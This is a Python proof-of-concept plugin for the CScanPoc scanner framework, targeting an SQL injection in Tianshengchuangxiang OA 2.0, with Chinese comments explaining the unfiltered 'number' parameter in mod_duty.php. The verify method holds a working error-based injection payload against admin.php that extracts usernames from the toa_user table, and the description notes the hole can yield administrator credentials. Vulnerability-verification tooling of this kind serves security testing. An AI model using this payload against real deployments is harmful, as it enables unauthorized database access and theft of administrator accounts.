# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Chuangxiang_0002_L'  # 平台漏洞编号，留空
    name = '天生创想OA 2.0前台用户SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-04-02'  # 漏洞公布时间
    desc = '''
        天生创想OA是由北京天生创想信息技术有限公司自公司打造的一款办公管理系统。
        天生创想OA 2.0 /duty/mod_duty.php 中：
        if ($number = getGP('number','G')) { //获取参数
        $wheresql .= " AND number=".$number.""; //没有进行过滤，组合进了sql语句
        //echo $wheresql;
        $url .= '&number='.rawurlencode($number);
        }
        造成注入，可报错，注入获取管理员账号密码。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/1471/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '天生创想OA'  # 漏洞应用名称
    product_version = '天生创想OA 2.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '653690e7-2993-4e7d-8855-20b413b60815'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-19'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 前台用户登入后
            s = requests.session()
            s.get(self.target)
            payload = "/admin.php?ac=duty&fileurl=duty&menuid=31&number=123%20and%20(select%201%20from(select%20count(*),concat((select%20(select%20(SELECT%20distinct%20concat(username,md5(c))%20FROM%20toa_user%20LIMIT%200,1))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)"
            url = self.target + payload
            r = s.get(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
